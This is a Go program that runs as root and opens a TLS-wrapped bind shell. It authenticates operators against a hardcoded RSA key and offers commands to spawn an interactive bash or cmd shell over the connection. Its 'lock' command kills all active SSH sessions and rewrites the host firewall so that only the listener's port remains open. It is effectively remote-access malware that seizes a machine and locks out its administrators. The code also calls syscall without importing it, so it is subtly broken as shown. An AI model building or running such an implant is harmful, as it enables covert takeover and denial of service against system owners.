package main

import (
	"bufio"
	"crypto"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/hex"
	"flag"
	"fmt"
	"math/big"
	"net"
	"os"
	"os/exec"
	"path/filepath" // Added for path manipulation
	"runtime"
	"strings"
	"time"

	"golang.org/x/crypto/ssh"
)

// --- CONFIGURATION ---

var encodedPubKey = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCjawcd0SpUKGRpEbZmhyOl79rdEgd+uBKZuvMxEvKiLA5LZncRcLG7+eiNJmyJpO1liG1sjLdoYpjpGTKWj5MmOUpCfb7I8IktmQwCKJLxsH2vakrpvzezxsseulr2SXwPXjmf2sajSbLaLSu3hrxaM54LQXrlzhK0WfAF8izixuT33thygcXjo7WSUTJOmSnPPEyhLQvvfEl3AQXk6SXYzZzxb8w+OEAmJazDuitakIJ9d9uo/e2D0SCihHfFmz3mp9esDUttVrE/C7oBauxEQGDsxZqdhQ9jIpafg9jP4arJDe6qNtMRXSgM8E5hWl0LSJ5hlQrq/IqcaoglLQAVpRI5IbyVF3Ct3G5emQRH/KB2RKPOD+HzyWnldHhrb1SDJeeDLkkEmfWJ68y0k73j5LP7qiZNaLk/ZRZblFxTUxAmrxeZp28+rLCrhG/7jbSIjrX6Tn6Vy131oQA0GSvdk1HBNpp9B/+tHC3gjnjdDtXsZub4WYCB6GbEhAbMQ50tIW32WJoIsiqxeUqCs9k5MoLSK2Nw8nF4JqWBOA9WI3G9Jx/f7jWCIAPZ4i06rVe98VbL+1WK+KIksGp0Z/8xcTaiE7fCU66Y655ODDHSyMW0OaCdtDdDNpzPkCSjfEMYhPoQ+PnK65hmfIZEjkOI36NCDwzHl2uwd3nj2IHxFQ== admin@DESKTOP-V9RAPTR" // <<<MARKING>>>

// Global to hold the port used for the listener
var activePort string

// Firewall
type FirewallType string

const (
	UFW       FirewallType = "ufw"
	Firewalld FirewallType = "firewalld"
	Iptables  FirewallType = "iptables"
	Unknown   FirewallType = "unknown"
)

// --- MODULAR COMMAND REGISTRY ---

type CommandHandler func(conn net.Conn, args []string)

var CommandRegistry = make(map[string]CommandHandler)

func init() {
	CommandRegistry["help"] = handleHelp
	CommandRegistry["ping"] = handlePing
	CommandRegistry["info"] = handleInfo
	CommandRegistry["lock"] = handleLock
	CommandRegistry["unlock"] = handleUnlock
	CommandRegistry["shell"] = handleShell
}

func main() {
	pFlag := flag.String("p", "9090", "Port to listen on")
	flag.Parse()
	activePort = *pFlag // Store in global for handlers

	if !HasRootAccess() {
		fmt.Println("Error: Not running as root. Firewall commands will fail.")
		os.Exit(1)
	}

	if detectFirewall() == Unknown {
		fmt.Println("Firewall is unknown!")
		os.Exit(2);
	}

	cert, err := generateInMemCert()
	if err != nil {
		fmt.Printf("Cert error: %v\n", err)
		os.Exit(1)
	}

	config := &tls.Config{Certificates: []tls.Certificate{cert}}
	address := "0.0.0.0:" + activePort

	listener, err := tls.Listen("tcp", address, config)
	if err != nil {
		fmt.Printf("Listen error: %v\n", err)
		os.Exit(1)
	}
	defer listener.Close()

	fmt.Printf("[*] Listening on %s\n", address)

	for {
		conn, err := listener.Accept()
		if err != nil {
			continue
		}
		go handleConnection(conn)
	}
}

func handleConnection(conn net.Conn) {
	defer conn.Close()

	if !authenticate(conn) {
		return
	}

	conn.Write([]byte("--- AUTHENTICATED SYSTEM READY ---\n> "))
	reader := bufio.NewReader(conn)

	for {
		line, err := reader.ReadString('\n')
		if err != nil {
			return
		}

		line = strings.TrimSpace(line)
		if line == "" {
			conn.Write([]byte("> "))
			continue
		}

		parts := strings.Split(line, " ")
		cmdName := strings.ToLower(parts[0])
		args := parts[1:]

		if handler, ok := CommandRegistry[cmdName]; ok {
			handler(conn, args)
		} else {
			conn.Write([]byte("Unknown command. Type 'help' for options.\n"))
		}
		conn.Write([]byte("> "))
	}
}

// --- HANDLERS ---

func handleHelp(conn net.Conn, args []string) {
	conn.Write([]byte("Available Modules:\n"))
	for name := range CommandRegistry {
		conn.Write([]byte(" - " + name + "\n"))
	}
}

func handlePing(conn net.Conn, args []string) {
	conn.Write([]byte("PONG\n"))
}

func handleInfo(conn net.Conn, args []string) {
	msg := fmt.Sprintf("OS: %s | Arch: %s | CPUs: %d\n", runtime.GOOS, runtime.GOARCH, runtime.NumCPU())
	conn.Write([]byte(msg))
}

func handleShell(conn net.Conn, args []string) {
	conn.Write([]byte("[!] Spawning interactive shell...\n"))
	var shell string
	if runtime.GOOS == "windows" {
		shell = "cmd.exe"
	} else {
		shell = "/bin/bash"
	}
	cmd := exec.Command(shell)
	cmd.Stdin, cmd.Stdout, cmd.Stderr = conn, conn, conn
	cmd.Run()
}

// handleLock updated with error reporting and backup path info
func handleLock(conn net.Conn, args []string) {
	conn.Write([]byte("[!] Initiating Firewall LOCKDOWN...\n"))

	// Define a standard backup path
	backupPath := "/var/backups/firewall_rules.bak"

	// Apply firewall and catch errors
	err := ApplyStrictFirewall(activePort, backupPath)

	if err != nil {
		// Report the error to the user without crashing the program
		errMsg := fmt.Sprintf("[ERROR] Lockdown failed: %v\n", err)
		conn.Write([]byte(errMsg))
		return
	}

	// Success reporting
	absPath, _ := filepath.Abs(backupPath)
	successMsg := fmt.Sprintf("[+] Lockdown successful.\n[+] Only port %s is allowed.\n[+] Backup saved to: %s\n", activePort, absPath)
	conn.Write([]byte(successMsg))
}


func handleUnlock(conn net.Conn, args []string) {
	conn.Write([]byte("[!] Initiating Firewall UNLOCK/RESTORE...\n"))
	backupPath := "/var/backups/firewall_rules.bak"

	err := RestoreFirewall(backupPath)
	if err != nil {
		conn.Write([]byte(fmt.Sprintf("[ERROR] Unlock failed: %v\n", err)))
		return
	}

	conn.Write([]byte("[+] Firewall successfully restored or set to allow all.\n"))
}

// --- FIREWALL LOGIC ---


func RestoreFirewall(backupPath string) error {
	fw := detectFirewall()
	_, err := os.Stat(backupPath)
	backupExists := err == nil

	switch fw {
	case UFW:
		// UFW backup in handleLock was just a text status, not a config file.
		// Best 'unlock' action for UFW is disabling it to allow all.
		return exec.Command("ufw", "disable").Run()

	case Firewalld:
		if backupExists {
			// Restore config directory
			exec.Command("rm", "-rf", "/etc/firewalld").Run()
			if err := exec.Command("cp", "-r", backupPath, "/etc/firewalld").Run(); err != nil {
				return err
			}
			return exec.Command("firewall-cmd", "--reload").Run()
		}
		// Fallback: Set to trusted zone (allow all)
		return exec.Command("firewall-cmd", "--set-default-zone=trusted").Run()

	case Iptables:
		if backupExists {
			return exec.Command("sh", "-c", "iptables-restore < "+backupPath).Run()
		}
		// Fallback: Flush all rules and set policies to ACCEPT
		exec.Command("iptables", "-F").Run()
		exec.Command("iptables", "-P", "INPUT", "ACCEPT").Run()
		exec.Command("iptables", "-P", "FORWARD", "ACCEPT").Run()
		return exec.Command("iptables", "-P", "OUTPUT", "ACCEPT").Run()

	default:
		return fmt.Errorf("no supported firewall manager found to unlock")
	}
}


func ApplyStrictFirewall(port string, backupPath string) error {
	if !HasRootAccess() {
		return fmt.Errorf("root privileges required")
	}

	// Ensure Backup Directory Exists
	backupDir := filepath.Dir(backupPath)
	if err := os.MkdirAll(backupDir, 0755); err != nil {
		return fmt.Errorf("failed to create backup directory %s: %v", backupDir, err)
	}

	absBackupPath, _ := filepath.Abs(backupPath)
	fw := detectFirewall()

	KillActiveSSHSessions()
	switch fw {
	case UFW:
		return setupUFW(port, absBackupPath)
	case Firewalld:
		return setupFirewalld(port, absBackupPath)
	case Iptables:
		return setupIptables(port, absBackupPath)
	default:
		return fmt.Errorf("no supported firewall manager found")
	}
}

func KillActiveSSHSessions() error {
	// The pattern "sshd:" matches session processes like "sshd: user@pts/0"
	// but does NOT match the master daemon "sshd".
	// -f tells pkill to look at the full command line arguments.
	cmd := exec.Command("pkill", "-f", "sshd:")

	err := cmd.Run()
	if err != nil {
		// pkill exit status 1 means no processes matched the pattern.
		// We should treat "no sessions found" as a success or a specific info case.
		if exitError, ok := err.(*exec.ExitError); ok {
			waitStatus := exitError.Sys().(syscall.WaitStatus)
			if waitStatus.ExitStatus() == 1 {
				return fmt.Errorf("no active SSH sessions found")
			}
		}
		return fmt.Errorf("failed to kill sessions: %v", err)
	}

	return nil
}

func detectFirewall() FirewallType {
	if isServiceActive("ufw") {
		return UFW
	}
	if isServiceActive("firewalld") {
		return Firewalld
	}
	if _, err := exec.LookPath("iptables"); err == nil {
		return Iptables
	}
	return Unknown
}

func isServiceActive(service string) bool {
	cmd := exec.Command("systemctl", "is-active", "--quiet", service)
	return cmd.Run() == nil
}

func setupUFW(port string, backupPath string) error {
	// Backup: Redirect status output to file
	backupCmd := fmt.Sprintf("ufw status numbered > %s", backupPath)
	if err := exec.Command("sh", "-c", backupCmd).Run(); err != nil {
		return fmt.Errorf("backup failed: %v", err)
	}

	// Chain commands
	cmds := [][]string{
		{"--force", "reset"},
		{"default", "deny", "incoming"},
		{"default", "deny", "outgoing"},
		{"allow", "in", port + "/tcp"},
		{"allow", "out", port + "/tcp"},
		{"allow", "in", "on", "lo"},
		{"allow", "out", "on", "lo"},
		{"--force", "enable"},
	}

	for _, args := range cmds {
		if err := exec.Command("ufw", args...).Run(); err != nil {
			return fmt.Errorf("ufw %v failed: %v", args, err)
		}
	}
	return nil
}

func setupFirewalld(port string, backupPath string) error {
	// Backup: copy the config dir
	if err := exec.Command("cp", "-r", "/etc/firewalld", backupPath).Run(); err != nil {
		return fmt.Errorf("backup failed: %v", err)
	}

	commands := [][]string{
		{"--set-default-zone=drop"},
		{"--permanent", "--zone=drop", "--add-port=" + port + "/tcp"},
		{"--direct", "--add-rule", "ipv4", "filter", "OUTPUT", "0", "-p", "tcp", "--dport", port, "-j", "ACCEPT"},
		{"--direct", "--add-rule", "ipv4", "filter", "OUTPUT", "1", "-j", "DROP"},
		{"--reload"},
	}

	for _, args := range commands {
		if err := exec.Command("firewall-cmd", args...).Run(); err != nil {
			return fmt.Errorf("firewall-cmd %v failed: %v", args, err)
		}
	}
	return nil
}

func setupIptables(port string, backupPath string) error {
	// Backup using iptables-save
	backupCmd := fmt.Sprintf("iptables-save > %s", backupPath)
	if err := exec.Command("sh", "-c", backupCmd).Run(); err != nil {
		return fmt.Errorf("backup failed: %v", err)
	}

	cmds := [][]string{
		{"-F"},
		{"-A", "INPUT", "-i", "lo", "-j", "ACCEPT"},
		{"-A", "OUTPUT", "-o", "lo", "-j", "ACCEPT"},
		{"-A", "INPUT", "-p", "tcp", "--dport", port, "-j", "ACCEPT"},
		{"-A", "OUTPUT", "-p", "tcp", "--sport", port, "-j", "ACCEPT"},
		{"-P", "INPUT", "DROP"},
		{"-P", "FORWARD", "DROP"},
		{"-P", "OUTPUT", "DROP"},
	}

	for _, args := range cmds {
		if err := exec.Command("iptables", args...).Run(); err != nil {
			return fmt.Errorf("iptables %v failed: %v", args, err)
		}
	}
	return nil
}

// --- CRYPTO UTILITIES ---

func authenticate(conn net.Conn) bool {
	challenge := make([]byte, 32)
	rand.Read(challenge)
	conn.Write([]byte(hex.EncodeToString(challenge) + "\n"))

	reader := bufio.NewReader(conn)
	sigHex, err := reader.ReadString('\n')
	if err != nil {
		return false
	}
	signature, err := hex.DecodeString(strings.TrimSpace(sigHex))
	if err != nil {
		return false
	}
	return verifySignature(challenge, signature)
}

func verifySignature(message, signature []byte) bool {
	pub, _, _, _, err := ssh.ParseAuthorizedKey([]byte(encodedPubKey))
	if err != nil {
		return false
	}
	cryptoPub, ok := pub.(ssh.CryptoPublicKey)
	if !ok {
		return false
	}
	rsaPub, ok := cryptoPub.CryptoPublicKey().(*rsa.PublicKey)
	if !ok {
		return false
	}
	hash := sha256.Sum256(message)
	return rsa.VerifyPKCS1v15(rsaPub, crypto.SHA256, hash[:], signature) == nil
}

func generateInMemCert() (tls.Certificate, error) {
	priv, _ := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	template := x509.Certificate{
		SerialNumber:          big.NewInt(1),
		Subject:               pkix.Name{Organization: []string{"Internal"}},
		NotBefore:             time.Now(),
		NotAfter:              time.Now().Add(time.Hour * 24),
		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
	}
	derBytes, err := x509.CreateCertificate(rand.Reader, &template, &template, &priv.PublicKey, priv)
	if err != nil {
		return tls.Certificate{}, err
	}
	return tls.Certificate{Certificate: [][]byte{derBytes}, PrivateKey: priv}, nil
}

func HasRootAccess() bool {
	return os.Geteuid() == 0
}